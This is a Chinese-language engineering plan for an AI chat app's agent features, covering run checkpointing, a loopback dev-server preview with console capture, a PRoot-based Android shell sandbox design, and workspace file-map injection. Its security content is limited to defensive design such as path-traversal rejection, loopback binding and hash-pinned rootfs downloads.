**2026-11-07 review 修正（已完成）**：mid-run 壓縮不再把 kernel 的累計 `tokensSoFar` 當 prompt 大小（同一段 100k context 跑多輪會被誤判為數十萬）；改由 driver 以「最後一輪 `usage.promptTokens` 與 working list 估算取大」計算 `promptTokens`，累計值只留給 token budget；step 0 仍只由 prep-time 評估。prep-time 新增 `evaluatePrepTimeCompaction()` 接線測試與 exact 30:00 邊界；`processFinishedAt` 的精度註記已改為「多數情況是最後一輪正文開始或純工具輪完成回填，非 usage 落盤時間」。

**風險**：壓縮 × cache 互咬（§7）——注入位置穩定與 marker 凍結切點原則不變。

---

### 2.4 P2-1 Checkpoint 持久化（durable-before-dispatch）✅

> **藍圖**：deepseek-harness `session-checkpoint-policy` + `SessionWriteBehind` 語意，**Hive 輕量版**——messages/tool events 已持久化，只需補 step 邊界 + pending 落地 + resume 進入點。ADR-A7 翻案手冊 §3.10「不做 L3 整輪恢復」（該 ADR 的時代假設「聊天＝短任務」在 agent run 時代不成立）。

**目標**：agent run 的中途狀態跨程序存活——app 被殺（Android phantom process、OEM 背景回收、Windows 崩潰、誤關視窗）後，長任務可從斷點恢復，不從頭重跑、不重付 token。

**落地內容（2026-11-07）**：
1. 新 Hive box **`agent_runs_v1`**（`AgentRunCheckpointStore`）：以 `conversationId` 為 key，存 `{schemaVersion, conversationId, assistantMessageId, stepIndex, tokensSoFar, phase, updatedAtMs, pendingTools[], softStopReason}`。`pendingTools` 只記 `approval`／`ask_user` 的 id/name；完整 approvals 與 tool 結果仍以 `tool_events_v1` 為權威來源。
2. **durable-before-dispatch 三邊界**：`onRoundStart` 先 `put + flush` 才 dispatch；工具結果在 `upsertToolEvent` 完成後才推進；`onRoundEnd` 落 step 完成標記。寫入採 eager flush（非 200ms debounce）——目前每個邊界都要求 crash 安全，批次化留給 P2-2 背景任務再優化。
3. **終態分類**：正常完成與使用者取消清除 checkpoint；approval／ask_user 暫停、串流中斷、`max_steps`／`token_budget` soft stop 保留；corrupt/非字串列在讀取時刪除，不阻塞啟動。
4. app 啟動 `HomePageController.initChat` 讀取最新 checkpoint → 顯示「上次任務尚未完成」橫幅；pending 卡只導航回對話讓使用者操作卡片，bare run 才呼叫既有 **`resumeRun`** facade。
5. 生命週期清理：對話刪除、`clearAllData`／`clearAllChatRows`、reset／legacy rebuild、backup restore 成功後清除；不進 backup／sync。

**同步歸類（已裁定）**：**裝置本地、排除備份**。run 狀態綁定本機程序生命週期，跨裝置恢復語意不成立；因此不加入 `_localOnlyKeys`，也不進 `chatHiveFiles` 的白名單。

**測試**：`test/agent_checkpoint` 6 tests（model round-trip、非法欄位、未知 phase、store 最新選擇、corrupt row 清理、delete/clear）；既有 `test/approval_lifecycle_test.dart`＋`test/core/services/agent/agent_loop_test.dart` 18 tests、`test/compaction` 99 tests 全數通過。UI 橫幅與實際重啟流程尚未做真機／桌面視覺 smoke，列為後續驗證。

**2026-11-07 review 修正（已完成）**：checkpoint 生命週期抽成 `AgentRunJournal`（`agent_run_journal.dart`）——durable-before-dispatch、pending 三態（known pending／known none／unknown）、run fence、終態分類都可單測（新增 `test/agent_checkpoint/agent_run_journal_test.dart`）。寫入失敗首次即降級為本 session 停用 journal 並記錄一次 log，不再讓 generation 直接失敗；`onToolResults` 只在 pending 出現／解除時落盤，其餘批次到 `onRoundEnd`。啟動橫幅改為 stream 終態／取消／切換對話時重新讀 store，resume 前再 `load()` 一次並擋 `loadingConversationIds`；使用者 dismiss 的 checkpoint 會以 key 記住，不會被刷新拉回。`pendingTools` 讀不到時回 unknown，終態保留既有 checkpoint。`AgentRunCheckpoint` 加 optional `runId`，store 刪 corrupt row 後 flush。

**2026-11-09 裁示（已完成）**：啟動橫幅「上次任務尚未完成」與 §2.12「進行中任務」頁全數移除——橫幅屬推播式恢復（實測打擾）、任務頁屬拉取式（無使用），恢復面收斂為**對話內就地式**：pending 審批／ask_user 卡與部分訊息本身就是動作點。P2-1 寫入地基（durable-before-dispatch、`AgentRunJournal`、`AgentRunFence`、pending 三態、對話刪除清理）**完整保留**，角色轉為隱形正確性保險；讀取面（`latest()`／`listAll()`）為 P2-2 背景任務收件匣預留（store 類別文件已註記勿當死碼刪除）。原「UI 橫幅視覺 smoke」驗證項隨橫幅移除作廢。

**kelivo 對照（§0.5）**：其 `ConversationToolPermissions` 的工程——授權屬於對話而非前景頁、寫入序列化尾巴、revision fencing、`context_changed` 例外——是 pendingApprovals 落地與「審批卡跨頁面／跨對話切換一致」的直接參考（抄語意不抄碼）。

---

### 2.5 P2-2 背景長任務（桌面托盤 + Android 前景服務）⬜

**目標**：長任務不因關窗／切背景而中斷——桌面關窗縮托盤續跑 + 完成通知；Android 前景服務 + 通知。

**實作內容**：
- **桌面**：`desktop_tray_controller` 現成——關窗改為縮托盤（可選偏好），run 進行中托盤顯示狀態；完成/失敗托盤通知（點擊喚起視窗跳轉對話）。
- **Android**：`AndroidBackgroundManager` 前景服務（現成）+ 進度/完成通知；`shell_run`（P1-6）不提供 Android，背景任務限 file/search/MCP 類工具。
- **依賴 P2-1**：背景續跑沒有 durable-before-dispatch 不安全（程序被回收後無從恢復）——本項必須在 P2-1 落地後開工。

**測試**：平台行為以手動 smoke 為主（托盤生命週期、前景服務通知管道）；單元測試鎖「run 進行中關窗 → 托盤駐留 → 完成通知」的狀態機。

---

### 2.6 P2-3 子代理（`spawn_subagent`）⬜

**目標**：泛化 AI Team 串行調度（ADR 延續 §5.1）——模型可派出子代理執行隔離任務，主對話不收原始工具軌跡。

**實作內容**：
1. 新工具 `spawn_subagent`：子代理**全新 context**、角色 prompt、回傳**摘要**；主對話只收摘要（省 token、隔離雜訊）。
2. 調度沿用既有串行先例（`AiTeamController`／`chat_actions._runProposerSilently`）——子代理與主對話外部程序/工具呼叫互斥（§5.1 never-parallel）。
3. 權限繼承：子代理工具集與審批政策繼承父代 generation 快照（比照 AI Team slot 繼承——deny/非成員回傳 result 不中斷流程）；子代理不彈審批卡（或暫停上拋主對話——細部計畫裁定）。
4. 候選用途：檔案批量摘要、平行翻譯（串行逐檔）、research fan-out。

**藍圖**：AnyBuff `agents/`（file-picker/researcher/thinker 等 template 模式）——抄 template 形狀，不抄 runtime。

**測試**：子代理 context 隔離（父代訊息不外洩）、摘要回傳形狀、工具權限繼承、串行互斥、maxSteps/預算獨立計。

---

### 2.7 P2-4 Mini dev server + Live 預覽 ✅【2026-11-08 完成】

> **落地紀錄（2026-11-08）**：新增 `lib/core/services/dev/`——`dev_server_service.dart`（loopback IPv4、port 0、MIME 查表、`FileToolService.resolveSafePath` 邊界＋dotfile 阻擋、Host／Origin 檢查、HTML 注入橋、SSE reload、console 環形緩衝、Directory.watch＋工具明確通知的 250 ms debounce、租約制 session）、`dev_mime.dart`、`dev_preview_tools.dart`（`get_console_errors`，levels/limit、無 session 回 `preview_not_running`、`ToolResultCaps` 32KB）、`dev_preview_controller.dart`（分頁、入口點探索、console 事件）。UI：`DevPreviewPanel`（分頁 chips、reload／外部瀏覽器／console 抽屜、Errors／Warnings／All 篩選與錯誤徽章、HTML 入口 chips、桌面 viewport preset Full／768／390、點狀背景＋卡片化預覽）＋`DevPreviewPage`（行動）＋`dev_preview_dialog.dart`（桌面 dialog，依 `MediaQuery` 夾限）。入口：工作區 popover／sheet「預覽網站」（2026-11-10 起排於「檔案」正上方）、檔案瀏覽器 `.html/.htm` 點擊／右鍵（AppBar Play 已於 2026-11-10 移除）、Workspace Tools 頁新增工具列。`ToolHandlerService` 在 10 個變更型 `file_*` 與 `shell_run`（`changed_files` 非空）後 `notifyWorkspaceChanged`；`get_console_errors` 免審批並納入 disabled 檢查。平台：Windows `webview_windows`、其餘 `webview_flutter`、Linux 不提供；Android cleartext 例外已存在，macOS 加 `NSAllowsLocalNetworking`＋Release `network.server`，iOS 加 `NSAllowsLocalNetworking`。零新 prefs key／零落盤。l10n ×4（21 keys）。測試：`dev_server_service_test`（22）、`dev_preview_controller_test`（8）、`dev_console_tool_test`（4），合計 34 案；`workspace_tools_toggle_test` 更新為 18 工具。`dart analyze lib` 0 errors。**2026-11-08 review 修正**：reload 時清空 console 舊錯誤（避免模型把上一版錯誤當成修復失敗）、retry 以新 port 重建 tab URL、共用 session 被其他工作區搶走時顯示「已停止」與 retry、`DevServerConsoleClearedEvent`、reload 後自動刷新入口清單、目錄列表 href 逐段 percent-encode、dialog 依 `MediaQuery` 夾限、`DevServerService.start` single-flight、shell 僅在 `changed_files` 非空時觸發 reload、移除未使用的 `/__omnichat/state`（避免露出絕對路徑）、`<header>` 誤判為 `<head>` 的注入回歸。與計畫差異：入口點探索深度 3／上限 80、目錄列表上限 500、HTML >16 MB 不注入、dotfile（含 `.well-known`）一律 404；預覽面板採 dialog／頁而非常駐側欄。
>
> **目標**：「製作網站」反饋閉環自動化——模型第一次能「看見自己作品的運行結果」：寫檔 → 頁面自動重整 → console 錯誤回到模型 → 自修。

**現況（開工前）**：`html_preview_dialog.dart` / `html_preview_page.dart` 已存在，為**單檔**靜態預覽——解析不了相對路徑引用的 CSS/JS/圖片，**根本無法預覽一個站**。**仍保留**：訊息內 HTML/SVG/XML 與 Markdown 預覽走原路徑；工作區 `.html/.htm` 改走 dev server。

**實作內容**：
1. 新 `dev_server_service.dart`：`127.0.0.1` **隨機埠**靜態伺服整個 workspace（MIME 類型表、路徑 traversal 防護——`..`/symlink 一律拒，比照 zip-slip 教訓；**僅綁 loopback**、workspace disabled 時不啟動）。
2. 預覽 UI 升級為**分頁面板**（既有 `html_preview_*` 為基礎）。
3. **watch + 自動重整**：workspace 檔案變更 → 注入 reload bridge。
4. **console 捕獲 bridge** → 新工具 `get_console_errors`（工具輸出經 `ToolResultCaps.cap`）。
5. 生命週期：伺服器隨對話/面板關閉而停；埠不持久化（零殘留原則——無新落盤檔案）。

**測試**：HttpServer 層單元測試（沿用 `replay_tool_results_api_test.dart` 的本地 HttpServer 捕獲風格）——MIME、traversal 拒絕、隨機埠、reload bridge 注入；`get_console_errors` 輸出上限。

---

### 2.8 P2-5 Proot on Android（**stretch**）⬜

> **藍圖已全文內化於下方**——原《CLI 工具整合計畫 v4》§七（Android PRoot backend；2026-08-05 完成設計）＋§十五（F-Droid 發行要求）已於 2026-11-06 吸收入本節，本項自給自足、不需回查原文。開工前仍先對照發行計畫（F-Droid/Store）現況。

**範圍（摘要）**：jniLibs `.so` 打包（API 29+ assets 壓縮無 exec 權限）；五階段 rootfs pipeline（download/stage/validate/activate/cleanup + lock + atomic rename + **hash pinning、不接受 LLM 指定 URL**）；rootfs patcher（DNS/hosts/`LANG=C.UTF-8`/tmp/groups）；FUSE noexec 限制；`MANAGE_EXTERNAL_STORAGE` 策略；phantom process/OEM 風險；前景單次 `shell_exec` 契約。**`WorkspaceMountTable` 為單一事實來源**——host↔guest `/workspace` 映射會波及 File Tools（非僅 shell）。F-Droid 條款（PRoot GPL source offer）見下文「F-Droid 發行要求」。

**kelivo 對照實作（§0.5；P2-5 開工時的直接參考）**：`lib/core/services/sandbox/`——`WorkspaceChannel`（platform channel；PTY session 以 UUID 命名，防 hot-restart 後 id 與原生側殘留註冊衝突）、`EnvironmentInstaller`（安裝／修復／重置／更新檢查、rootfs 版本 marker 檔、ABI 驗證、`EnvironmentPhase` 狀態機）、`MirrorService`（apt/pip/npm **鏡像測速自動套用**）、`ios_ish_runtime.dart`（iSH）；`workspace/ProotCommand.kt`（argv 組裝：`--root-id`＋`--link2symlink`＋`--kill-on-exit`、talloc `.so`→`.so.2` **SONAME staging**（jniLibs 只收 `lib*.so` 命名）、`PROOT_LOADER`／`PROOT_TMP_DIR`、命令以 positional argument 遞 `bash -lc 'cd -- "$1" && eval "$2"'`——與條目 1「獨立 argument、不拼接」同紀律）；`workspace/workspace_paths.dart`（**`WorkspacePaths`＝kelivo 版翻譯表**：固定 4 guest zone `/workspace`/`/chat`/`/skills`/`/tmp`＋`resolveReal`/`toModelPath` 雙向翻譯、zone classify、symlink-follow、`..`／NUL／跨 zone 逃逸擲 `PathResolutionException`——kelivo 的 file 工具同樣在 host 端吃 host path、shell 吃 guest path，**雙路徑宇宙同樣存在**，直接印證條目 7 非過度設計）。**Mount 組裝時機取捨（2026-11-06 裁定）**：kelivo 的 `Mount(host/guest/readOnly)` 清單隨**每個 `CommandRequest`／PTY 開啟重組**——mount set 是「每次執行的參數」，external mount 增減即時生效；本計畫**維持 generation 快照**（條目 7 `WorkspaceMountTable` 單一事實來源）——OmniChat 的 File Tools 在 host 端，須與 guest shell 共用同一張表、防世代錯位；彈性差異照實記錄、不視為缺口。實測修復已驗證的坑：32-bit Android 可跑沙盒（需 `--kernel-release`，見條目 4）、app proxy 傳入 guest 程序。與本節內化藍圖高度一致——開工時以「kelivo 已上線行為」逐項對照本節藍圖驗證，**抄設計不抄碼**。

**AnyBuff 對照實作**（2026-11-06 補入；本機 `C:\Users\w2bn1\GitHub\Anybuff`，同作者自有專案——**Android proot-Node 沙盒已上線**（v1.7.1 APK；ADR-21），本項的第二個在線對照組。開工時與 kelivo `sandbox/` 並列逐項對照已在線行為，**特別注意本藍圖未列、而 AnyBuff 已實測的兩件：可移除卷映射與 `/proc` 偽造**——抄設計不抄碼）**：`android/app/src/main/java/com/anybuff/android/`——`engine/ProotRunner.kt`：bind 全景（app 私有 workspace→`/workspace`；另掛 `/engine-assets`、guest node binary、`/hostdata`、`/upload`、`/skills`；`/dev`＋`/dev/urandom:/dev/random` 嵌套 bind 範例；`/proc`/`/sys`）＋**`/proc` 偽造**（預生成 `stat`/`loadavg`/`version`/`vmstat` 假檔＋`--kernel-release` 假核心）＋`--kill-on-exit`＋spawn 前 `killStraySandboxProcesses()`（SIGKILL 後 guest Node 孤兒 → 記憶體壓力連環殺的已修復教訓）＋mount set 於 spawn 定格、變更須 fresh spawn；`bridge/DirectAccess.kt`：**§4.6 AFA direct-bind trial**——`Environment.isExternalStorageManager()` 權限閘＋系統設定導流、tree URI→raw path 推導（`primary:`→`/storage/emulated/0`；九位 hex 卷 id→**可移除卷 `/storage/<uuid>`（SD/OTG）**——AFA 路線的獨勝場景）、寫/刪 `probeWritable` probe 不過即退 SAF copy flow、registry 置 `filesDir/direct-binds.json`（pause 偏好＝registry 保留而暫停期不掛載、stale bind 跳過、未變更 re-pick 不重啟、registry 讀取失敗不得阻塞 engine boot）；`engine/RootfsInstaller.kt`＋`engine/SafeTarExtractor.kt`：rootfs 安裝與解壓 traversal 防護——條目 5 五階段 pipeline 的 stage/validate 對照；`engine/SandboxPaths.kt`：runtime 目錄布局對照（條目 3）。**架構定位差異（照實記錄，防誤抄）**：AnyBuff 的 agent 引擎（Node host）整個跑在 guest 內——工具層只有單一路徑宇宙（guest path），**沒有** host↔guest 路徑翻譯需求；OmniChat 的 File Tools 在 host 端（Dart）吃 host path，故條目 7 `WorkspaceMountTable` 的雙向翻譯職能為本計畫特有，不因「AnyBuff 無此表」而移除。其外部專案是「SAF copy flow（預設）＋AFA direct bind（試驗）」雙軌——OmniChat 無 copy flow、拒 `content://` 的立場（條目 9）維持不變。

**內化藍圖（原《CLI 工具整合計畫 v4》§七全部＋§十 Android 行＋§十四 Android 風險＋§十五；2026-11-06 吸收自 2026-08-05 v4 全文——以下為本項權威藍圖，執行時不需回查原文）**：

1. **支援範圍與命令形狀**：Android 只提供**前景單次 `shell_exec`**；`shell_script`、`shell_exec_background`、`shell_job_status`、`shell_job_stop` 不供 Android（背景工作一律不在產品契約內——P2-2 的 Android 背景任務亦限 file/search/MCP 類）。多步驟工作以 inline 命令串接承接（見整合註記 ADR-A8 條）。命令以**獨立 argument** 傳入 guest shell，不把未處理的 command 字串拼接進 host command line：
   ```text
   PRoot --rootfs <rootfs> --bind <workspacePath>:/workspace --cwd /workspace --kill-on-exit /bin/sh -c <command>
   ```
   `/workspace` 為 guest path、File Tools 用 host physical path——兩者必須映射到同一實體目錄（由 `WorkspaceMountTable` 保證，見 7）。
2. **工具參數**：`command`（必填）；`cwd`（workspace 根之子目錄，預設根；禁 host absolute path 與 `..`；執行期對應 guest `/workspace` 下的相對位置）；`timeout_seconds`（v4 草案值：預設 30、hard 120——與 P1-6 kelivo 增量的 900／clamp 1–3600 **不同**，併批準則見整合註記）。Android 無 `shell` 參數——固定 guest `/bin/sh`；rootfs 含 Bash 時才可比照以 login Bash＋positional arguments 傳遞 cwd/command。
3. **Runtime layout 與 process 契約**：rootfs 與 runtime 皆置 app 私有目錄 `{appData}/cli_runtime/`（`bin/`、`rootfs/<version>/`、`tmp/`、`cache/`、`locks/`、`metadata.json`）。通用外部程序契約沿用 §2.2 執行契約（collectors 先於 wait、超 cap 持續 drain、序列化總長 ≤32,768 字元、UTF-8 `allowMalformed` 解碼）；Android 專屬：PRoot 以 **`--kill-on-exit`** 啟動，確保 PRoot 結束時 guest child 不殘留（不可只依賴對 PRoot 父進程的單獨 kill）；guest 端 `LANG=C.UTF-8` 由 rootfs patcher 設定。**guest 環境以 `env -i` 式全 wipe 起始**——不繼承 host 環境，僅由 command builder 補最小集 `HOME`／`PATH`／`LANG=C.UTF-8`（kelivo 上游 `env -i` 行為；藍圖原僅明定 LANG，2026-11-06 補齊 wipe 語意）。
4. **PRoot binary 打包（jniLibs）**：`android/app/src/main/jniLibs/arm64-v8a/libproot_exec.so`（必要時含 loader `.so`）；**禁用 Flutter assets**——API 29+ 壓縮 assets 無 exec 權限。執行策略**二選一後固定**：①`android:extractNativeLibs="true"`（安裝時解壓至 nativeLibraryDirectory，該路徑可執行）；②uncompressed＋page-aligned 直接自 APK 執行（需確認 16 KB alignment 與 exec bit 行為）。啟動 probe：解析實際 binary path、驗證可執行、記錄 hash 與版本 metadata；binary 必須為 bionic/linker 相容 build（**不可**假設一般 linux-aarch64 binary 可跑）；真機驗證 `proot --version`、`echo`、`ls`、`cat`、`/bin/sh`；probe 失敗 → Shell disable（`broken`）。release APK 目前 ARM64-only——新增 ABI 必須同時提供對應 binary 或明確限縮 ABI filter；若未來啟用 32-bit ABI，PRoot argv 需附加 **`--kernel-release`**（fallback `Os.uname().release`）以避開 vendor vDSO 偽核心擋路（kelivo #1231 已驗證；arm64-only 現況不適用，僅作 ABI 鉤子備註）。
5. **Rootfs bootstrap——五階段 pipeline**：Alpine rootfs 有明確版本/ABI/hash/來源 URL；**pinned、可追蹤來源＋hash 驗證——不接受 LLM 任意指定 rootfs URL**（若開放手動 URL：僅限使用者明確操作＋HTTPS＋大小受限＋hash 驗證，模型不可改變 runtime source）；rootfs 打包於 APK 或首次啟動下載**擇一後固定**；tar.gz/tar.xz 由 pinned metadata 或副檔名判斷。**五階段**：`download`（connect/read timeout、大小上限、progress、取消）→ `stage`（解壓前先取 **lock**——防兩個 generation 併發初始化；staging 解壓＋path traversal 檢查）→ `validate`（`/bin/sh`、必要 symlink、executable mode、ABI/version/hash）→ `activate`（**atomic rename** 替換 active rootfs；失敗保留舊版或回 disabled/broken）→ `cleanup`（刪 archive、staging、rootfs `/tmp`、`/var/tmp`、app temp files）。partial extraction 下次啟動可安全清理重解；rootfs／apk cache／staging／user-installed packages 皆設 **disk quota**（可查看、可清理）；bootstrap progress 本地化字串、不阻塞 UI。
6. **Rootfs patcher（可重複、可測試）**：寫入可用 DNS resolver；`/etc/hosts`、localhost 與 hostname 合法；`LANG=C.UTF-8`；建立 `/tmp`、`/var/tmp`、`/root` 並設定權限；必要時 host supplementary group 對應（避免 bind mount 存取出現難解的權限錯誤）；**僅修改 rootfs staging/active 內允許的檔案，不可觸碰 host workspace**。
7. **`WorkspaceMountTable`——單一事實來源**：所有 bind mount 集中管理，同一份表同時供給：PRoot command builder、File Tools 的 guest↔host path resolver、system prompt 可用路徑說明、runtime cleanup 與 probe。entry 欄位：host source、guest target、RO/RW policy、類別（workspace/runtime/optional）、File Tools 可否讀寫。resolver 語意對照 kelivo `WorkspacePaths`：**`..`、NUL、symlink-follow 跨 zone（mount boundary）逃逸一律拒絕擲例外**（`PathResolutionException` 式）；測試需含最長 target match、RO policy、host/guest round-trip、**逃逸拒絕**。**RO/RW policy 的執行層在 app（File Tools policy＋prompt）——proot `-b` 本身不強制 read-only**，bind 進 guest 後實際可寫，不得把 bind policy 當安全邊界（kelivo 同款行為）。**預設只 bind**：rootfs、通過 host probe 的 workspace → `/workspace`、真機確實需要的 `/proc`/`/sys`/`/dev`；**不得因方便而 bind 整個 `/storage/emulated/0`、`/data`** 或其他 host tree——每一個額外 bind 都擴大 command 可見的 host 資源。**FUSE/sdcardfs 限制（照實告知模型與使用者）**：external workspace 位於 `/storage/emulated/0` 時**不支援 exec bit、symlink 與 POSIX permission**——可讀寫資料檔、不能在該 workspace 內執行 script 或建立 symlink；prompt 與錯誤訊息必須說明此限制；probe 不因 noexec 失敗（資料讀寫仍可用）。
8. **Host path probe**（提供 Android Shell definitions **之前**）：①path 是 directory ②app 可列出目錄 ③可建立並刪除 random probe file ④非 `content://` URI ⑤canonical path 與 workspace 設定一致；probe 失敗回傳清楚的 permission/path error——不延後至 PRoot command 執行時才暴露。
9. **Storage permission 策略**（F-Droid-only 前提）：Manifest 保留 `MANAGE_EXTERNAL_STORAGE`；僅在使用者選擇外部 workspace 時導向 Special app access（系統設定）；從設定頁返回後 recheck；denied 時保留 app-private workspace 與 disabled 選項、**不得把 permission denied 靜默轉成外部 workspace 成功**；`requestLegacyExternalStorage` 不作 Android 11+ 權限策略依據；`content://` SAF path 明確拒絕、不傳入 PRoot。
10. **套件安裝契約**：使用者或 LLM 可透過 `shell_exec` 執行 `apk add` 等安裝命令，但**不承諾所有套件可用**——受前景 timeout 限制；大型 Python package、native compilation、重型資料分析套件可能失敗或超時；package cache 與 rootfs quota 可查看清理；network/DNS/Alpine mirror/OEM 差異真機驗證；不提供 background install 或稍後自動完成的承諾。
11. **資源限制（Android 列）**：預設 timeout 30s／hard 120s；stdout cap 24 KB／stderr 6 KB（序列化總長 ≤32,768 字元——§2.2 同源預算）；同時前景執行 1 個；app restart recovery 不適用。**app 進背景／鎖屏不承諾 command 完成**——前景服務（P2-2）即便維持 generation，PRoot child 實際存活仍需真機確認；這不等於支援 background jobs。
12. **non-sandbox prompt 契約**：system prompt 明文 `Commands start in the selected workspace. This is not a security sandbox.` 並說明已設定的 PRoot bindings；Android prompt 說明 command 的 current directory 是 `/workspace`（shell 工具使用 guest path）與 external workspace noexec 限制；**不要求模型使用 host absolute path**（host path 只留在 app 內部 execution context）；不得宣稱 workspace 邊界可限制 shell commands。
13. **實作檔案（v4 §十一 Android 子集；命名建議對齊 P1-6 的 `lib/core/services/shell/`）**：`shell/android_proot_backend.dart`、`shell/proot_bootstrap.dart`、`shell/rootfs_patcher.dart`、`shell/workspace_mount_table.dart`、`shell/workspace_path_probe.dart`＋對應測試（backend/bootstrap/patcher/mount_table/probe）；`android/app/src/main/jniLibs/arm64-v8a/libproot_exec.so`；`android/app/build.gradle.kts`（packaging/ABI filter）與 `AndroidManifest.xml`（`extractNativeLibs`、storage permission）核對；F-Droid license/source/metadata 檔。
14. **完成條件（Android 部分，原 v4 §十六相關條目）**：Android 只提供 `shell_exec`；至少一台 arm64 真機以 jniLibs `.so` 啟動 PRoot 執行 `echo`/`ls`/`cat`；app-private workspace **免 `MANAGE_EXTERNAL_STORAGE` 即可執行**；external workspace 僅在 permission＋probe 雙成功時啟用，且 noexec 限制已對模型與使用者說明；PRoot、File Tools、path resolver、prompt 與 cleanup 共用同一 mount table；同一 generation 兩個工具家族使用同一 physical workspace path；`cwd` 限於 `/workspace` 對應範圍；rootfs pipeline（含 patch、atomic activate、broken recovery）測試通過；restore 後 rootfs 依版本/hash 重建（見整合註記）；license/文件完整。
15. **F-Droid 發行要求（原 v4 §十五全部——本項合規的權威清單）**：公開 PRoot source、GPL-2.0-or-later license 與 source offer；公開 PRoot 修改內容與 build instructions；追蹤 Alpine rootfs 與預置套件的版本、來源與 license；不提交無法從 source 重建的 opaque binary；runtime asset hash、版本 metadata 與 release artifact 一致（可重現建置）；README 與設定頁說明 Shell 的任意命令能力與 non-sandbox 性質；說明 Android shared storage 需使用者授權 `MANAGE_EXTERNAL_STORAGE`；說明僅支援前景單次 command、不支援 background job。

**整合註記（2026-11-06，取代 v4 時代假設）**：
- **ADR-A8 衝突消解**：v4 草案的「`file_write` 建立 Python/文字腳本 → `shell_exec` 執行」與本計畫 ADR-A8「Android 維持全域黑名單」衝突——多步驟改以 **inline 命令／`python -c`／heredoc** 承接，不在 Android 工作區落腳本檔。
- **timeout 值的併批**：v4 草案 30/120 秒 vs P1-6 已納入 kelivo 增量的 `timeout_seconds`（預設 900、clamp 1–3600）——若 P2-5 併入 P1-6 批次，以 §2.2 採用值為基準、按 Android 真機前景存活實測調整（細部計畫裁定）。
- **Backup 與 restore 歸屬**：rootfs、apk cache、PRoot runtime**不入備份**；restore 後 rootfs 依 bootstrap 版本/hash 重建；command history 僅為歷史記錄、**不自動 replay**；不存在或無權限的 workspace 顯示 invalid/unavailable、不得靜默改寫路徑。backup 版本升級統一走 P1-6／P2-1 的手冊 §3.8 流程（v4 的 v3→4 動作屬其範圍，本項不重複升版）。
- **tool events 與 FileRecord**：Android shell tool events 沿用 P1-6 的 shell events 落地（`tool_events_v1`、受限 preview cap、secret 遮蔽）；shell 產生的檔案不自動建立 FileRecord（由 File Browser／後續 file 工具查看與操作）。

**狀態**：stretch——P1-6 落地後再評估投入；本項不阻塞任何其他項目。

---

### 2.9 P2-6(L3) 工作區檔案地圖注入（僅 L3）✅【2026-11-10 完成】

> **落地紀錄（2026-11-10）**：新檔 `lib/core/services/workspace/workspace_file_map.dart`——掃描**重用** P1-6 `WorkspaceSnapshot.capture`（async、20k 上限、不跟 symlink、噪音目錄清單），地圖層加嚴**任何 dot 段落一律丟棄**（`.env`／`.omnichat` 不入 prompt）。注入點在 `prepareApiMessagesWithInjections`：gate 為「`file_list` 實際註冊於本次請求」（§2.3.1 教義），地圖 append 到 system 訊息尾部（`applyContextLimit` 之後故不受裁切）；本對話 FileRecord 內 workspace 內路徑標 `· agent-written`。**快取前綴契約**：只渲染穩定樹事實（相對路徑集＋大小），未變更樹逐字相同、mtime-only `touch` 不打冷 cache；同大小改寫不反映（地圖僅導航輔助）。**三段預算降級**：全量（`- path · 2.1 KB[ · agent-written]`）超 `tokenCap = 1600` → 純路徑 → 二分最長前綴＋`(+N more files not shown)`；標頭仍報全樹檔案數；渲染上限 200 筆（三段強制，snapshot 截斷加 `listing may be incomplete`）；空工作區／失敗不注入且不影響組裝。測試：`test/workspace_file_map_test.dart` 8 案（確定性／噪音／標記／快取契約／降級／硬上限／file_list 一致性）。**與計畫差異**：資料源改「大小（全檔）＋agent-written 標記（FileRecord）」而 mtime 不渲染（打冷 cache 風險）；呈現採排序扁平清單而非常樹（相對路徑已編碼層級、與 `file_list` 一致）；無新 prefs／無 UI／無 l10n。

> **L2 LLM 摘要：不採**（v1.4 評估結案 + 2026-11-06 裁示確認）。P2-6 僅保留 L3。

**目標**：組裝期注入 workspace 樹 + per-file 一行描述——模型不讀檔就知道工作區有什麼，需詳情再 `file_read` 指定範圍。對 Cowork 長任務的價值高於 L2：防「找不到檔案→亂猜路徑→重試循環」。

**實作內容**：
1. 組裝期（`prepareApiMessagesWithInjections` 同段）掃描 workspace 樹（沿用 `countSkillFiles` 同款噪音清單——`.git`/`node_modules`/`__pycache__`/點開頭項目）。
2. per-file 一行描述，資料源 **FileRecord/mtime**（`chat_service_file_record_test` 既有記錄機制）；無記錄者僅列路徑。
3. **注入預算上限**（比照 `knowledgeBlockTokenCap` 慣例，建議 ~1–2k tokens；超出時僅列樹、略描述）。
4. **cache-prefix 友善**：注入位置固定（system prompt 尾部，比照 todo 快照槽位）；內容以 mtime 為失效鍵——**檔案未變則逐字相同**，避免每輪抖動打冷 cache（§7 風險的對症措施）。
5. 藍圖：AnyBuff `truncate-file-tree` 概念。

**測試**：地圖渲染確定性（同一樹狀態 → 穩定輸出）、預算截斷、噪音清單排除、mtime 失效重建、與 `file_list` 工具輸出的一致性。

---

### 2.10 P2-7 kelivo 資料模型對齊（**可選**）⬜

`message.parts` 遷移 + sealed StreamChunk 事件模型 + trace 錄製回放測試——**僅在需要持續吸收上游 decoder 修補時才做**，否則維持 `tool_events_v1` 投影。藍圖：kelivo `a43b79f` + `docs/ai-stream.md`。不阻塞任何項目。

---

### 2.11 P3-1 瀏覽器 QA 工具（Playwright via MCP，桌面限定）✅【2026-11-10 完成】

**目標**：三種「執行後驗證」能力——**截圖**（看實際渲染）、**console errors**、**點擊驗證**（互動行為）。靜態正確 ≠ 行為正確：布局跑版、事件沒綁上、非同步載入失敗在程式碼裡看不出來。

**實作內容**：
1. 以 **MCP STDIO** 接 Playwright——**不在 app 內嵌瀏覽器引擎**（不碰 WACK/商店合規敘事、不增體積；Playwright 作為外部程序由開發者環境提供，這也是限定桌面的原因：Android 跑不動 Node/Playwright）。
2. 掛入既有 MCP 基礎設施（`McpProvider`/`McpToolService` 已在 `tool_handler_service.dart` 接線、`mcp_pane` UI 現成）——本項主要是**設定檔/預設值與文件**，代碼量小。
3. 與 P2-4 搭配（有持續開著的頁面才有得驗證）；截圖留在工具卡裡，人看得到模型看了什麼（「可監督」升級為「模型自證 + 人可抽查」）。

**測試**：MCP server 連線失敗分類（未安裝 Playwright → 可理解錯誤）；工具輸出上限；桌面限定閘。

